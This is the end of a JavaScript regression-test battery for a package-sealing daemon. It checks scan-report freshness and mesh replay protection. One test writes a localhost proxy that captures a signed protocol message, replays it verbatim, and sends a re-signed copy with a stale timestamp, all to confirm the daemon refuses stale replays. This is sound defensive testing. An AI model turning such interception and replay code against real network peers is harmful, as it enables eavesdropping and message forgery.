      fs.writeFileSync(path.join(W, `${name}.scan-report.scripture`), repSealed.text, { mode: 0o600 });
      const sealed = sealPlaintext(evilBytes, meA, meA, {
        expires: Date.now() + 3600e3,
        scan: {
          verdict: rec.verdict, digest, reportCanary: repSealed.frame.canary,
          override: { by_sign_fp: meA.signFp, reason: 'phase4 freshness case', at: new Date().toISOString() },
          tier: 2,
        },
      });
      const pkg = path.join(W, `${name}.scripture`);
      fs.writeFileSync(pkg, sealed.text, { mode: 0o600 });
      const reg = await ownerRpc(dA.socket, {
        cmd: 'register',
        entries: [{
          canary: sealed.frame.canary, digest: frameDigest(sealed.frame), digest_kind: 'commit',
          recipient_seal_fp: meA.sealFp, sender_sign_fp: meA.signFp, expiry: sealed.frame.expiry,
          origin: 'activation-store',
          scan: { verdict: rec.verdict, digest, report_canary: repSealed.frame.canary },
          tier: { tier: 2, params: tierParams(2, { scan: { tiers: { 2: { scan_max_age_hours: 1 } } } }) },
        }],
      });
      if (!reg.ok) throw new Error(`freshness case register failed: ${JSON.stringify(reg)}`);
      return pkg;
    };
    const stalePkg = await mkCase('stale2', new Date(Date.now() - 2 * 3600e3).toISOString());
    const rs = await activateStream(dA.socket, stalePkg).final;
    const staleLast = rs[rs.length - 1];
    check('a Tier-2 package whose bound report is 2 h old (bound: 1 h) refuses scan-stale',
      staleLast?.ok === false && /scan-stale/.test(staleLast?.error || ''), JSON.stringify(staleLast).slice(0, 220));
    const freshPkg = await mkCase('fresh2', new Date().toISOString());
    const rf = await activateStream(dA.socket, freshPkg).final;
    const freshLast = rf[rf.length - 1];
    check('a fresh Tier-2 report passes the freshness gate (then refuses cell-unavailable, NOT scan-stale)',
      freshLast?.ok === false && /cell-unavailable/.test(freshLast?.error || '') && !/scan-stale/.test(freshLast?.error || ''),
      JSON.stringify(freshLast).slice(0, 220));
  }

  // ================= S8: mesh replay freshness =======================
  console.log('\n[S8] FIX 6 — captured mesh documents die on schedule');
  {
    await stopDaemon(dA);
    const B_PORT = 18741;
    const TEE_PORT = 18742;
    writePolicy(B, { estate: { mesh_listen: `127.0.0.1:${B_PORT}`, mesh_skew_s: 2 } });
    trust(A, 'bravo', B, `127.0.0.1:${TEE_PORT}`);
    dB = await startDaemon(B, { mesh: true });
    // The tee: captures the first client line, forwards everything.
    // It MUST live in its own process: the battery's armor() helper is
    // spawnSync, which blocks this process's event loop — an in-process
    // tee can never forward while a wrap is running (the first version
    // of this case proved exactly that: the wrap queued, the tee saw
    // nothing). The child writes the captured line to a file instead.
    const capFile = path.join(W, 'tee-capture.txt');
    const teeSrc = path.join(W, 'tee.mjs');
    fs.writeFileSync(teeSrc, `
import net from 'node:net';
import fs from 'node:fs';
const [listenPort, targetPort, capFile] = process.argv.slice(2);
let captured = false;
net.createServer((client) => {
  const upstream = net.createConnection(Number(targetPort), '127.0.0.1');
  let cbuf = '';
  client.on('data', (d) => {
    cbuf += d;
    if (!captured && cbuf.includes('\\n')) {
      captured = true;
      try { fs.writeFileSync(capFile, cbuf.slice(0, cbuf.indexOf('\\n'))); } catch {}
    }
    upstream.write(d);
  });
  upstream.on('data', (d) => client.write(d));
  client.on('error', () => { try { upstream.destroy(); } catch {} });
  upstream.on('error', () => { try { client.destroy(); } catch {} });
}).listen(Number(listenPort), '127.0.0.1');
`);
    const tee = spawn(NODE, [teeSrc, String(TEE_PORT), String(B_PORT), capFile], { stdio: 'ignore' });
    await sleep(600);
    const mp = writePayload('mesh-msg.txt', 'memory over the mesh\n');
    const w = armor(['wrap', mp, '--to', 'bravo', '--identity-dir', A]);
    let captured = null;
    for (let i = 0; i < 40 && !captured; i++) {
      try { captured = fs.readFileSync(capFile, 'utf8'); } catch { await sleep(250); }
    }
    check('mesh registration flows (through the tee)', w.code === 0 && !!captured, w.err.slice(0, 200));
    const doc = captured ? JSON.parse(captured) : {};
    check('the captured document is a signed register doc with at+nonce',
      doc.type === 'register' && !!doc.at && !!doc.nonce);
    const entriesBefore = Object.keys(registryOf(B).entries).length;
    const back = await presentAndApprove(dB.socket, `${mp}.scripture`, 'mesh-back.txt');
    check('the mesh-registered package opens at the peer', back.last?.state === 'unwrapped',
      JSON.stringify(back.last).slice(0, 200));
    // Verbatim replay inside the window: cached response, no re-execution.
    const replay1 = await meshSend(B_PORT, captured);
    check('in-window verbatim replay returns the cached ok (idempotent retry)',
      !!replay1 && replay1.body?.ok === true, JSON.stringify(replay1?.body || replay1).slice(0, 160));
    check('the replay inserted nothing twice',
      Object.keys(registryOf(B).entries).length === entriesBefore);
    const reconsume = await present(dB.socket, `${mp}.scripture`, 'mesh-again.txt').final;
    check('the replay did NOT resurrect consumption (re-presentation beacon-refuses replay-consumed)',
      reconsume.some((m) => m.reason_class === 'replay-consumed'), JSON.stringify(reconsume).slice(0, 200));
    // After the window: the same bytes die on `at` alone.
    await sleep(2400);
    const replay2 = await meshSend(B_PORT, captured);
    check('out-of-window verbatim replay refuses mesh-stale',
      !!replay2 && replay2.body?.ok === false && /mesh-stale/.test(replay2.body?.error || ''),
      JSON.stringify(replay2?.body || replay2).slice(0, 160));
    // A fresh nonce cannot launder a stale timestamp.
    const doctored = signPayload(idA, {
      type: 'register', to_seal_fp: idB.sealFp, body: { entries: [] },
      at: new Date(Date.now() - 3600e3).toISOString(), nonce: crypto.randomUUID(),
    });
    const replay3 = await meshSend(B_PORT, doctored);
    check('a re-signed doc with a stale at refuses mesh-stale (freshness precedes dispatch)',
      !!replay3 && replay3.body?.ok === false && /mesh-stale/.test(replay3.body?.error || ''),
      JSON.stringify(replay3?.body || replay3).slice(0, 160));
    tee.kill('SIGKILL');
  }

  await stopDaemon(dB);
  console.log(`\nTOTAL: ${passed} passed, ${failed} failed, ${blocked} blocked groups`);
  if (failures.length) { console.log(`failures: ${failures.join(' | ')}`); process.exit(1); }
  console.log(blocked ? 'RUNNABLE PHASE-4 CHECKS PASSED; platform execution groups remain BLOCKED' : 'ALL PHASE-4 REGRESSION CHECKS PASSED');
}

// The airlock peer script + dock helpers (Closure 3 battery shapes).
const PEER_SRC = `
import fs from 'node:fs';
import net from 'node:net';
import crypto from 'node:crypto';
const [sock, actionsPath, logPath] = process.argv.slice(2);
const actions = JSON.parse(fs.readFileSync(actionsPath, 'utf8'));
const log = (o) => fs.appendFileSync(logPath, JSON.stringify({ ts: Date.now(), ...o }) + '\\n');
const conn = net.connect(sock);
let buf = Buffer.alloc(0);
conn.on('data', (d) => {
  buf = Buffer.concat([buf, d]);
  for (;;) {
    if (buf.length < 4) return;
    const len = buf.readUInt32BE(0);
    if (buf.length < 4 + len) return;
    const payload = Buffer.from(buf.subarray(4, 4 + len));
    buf = buf.subarray(4 + len);
    log({ recv_sha256: crypto.createHash('sha256').update(payload).digest('hex'), recv_bytes: payload.length });
  }
});
conn.on('error', (e) => log({ error: e.message }));
conn.on('close', () => log({ closed: true }));
const frame = (payload) => { const h = Buffer.alloc(4); h.writeUInt32BE(payload.length, 0); return Buffer.concat([h, payload]); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
conn.on('connect', async () => {
  log({ connected: true });
  for (const a of actions) {
    if (a.delayMs) await sleep(a.delayMs);
    let payload = null;
    if (a.sendFile) payload = fs.readFileSync(a.sendFile);
    else if (a.sendText) payload = Buffer.from(a.sendText, 'utf8');
    if (payload) conn.write(frame(payload));
  }
});
setTimeout(() => process.exit(0), actions.lifetimeMs || 30000);
`;

main().catch((e) => { console.error(`BATTERY ERROR: ${e.stack || e.message}`); process.exit(1); });
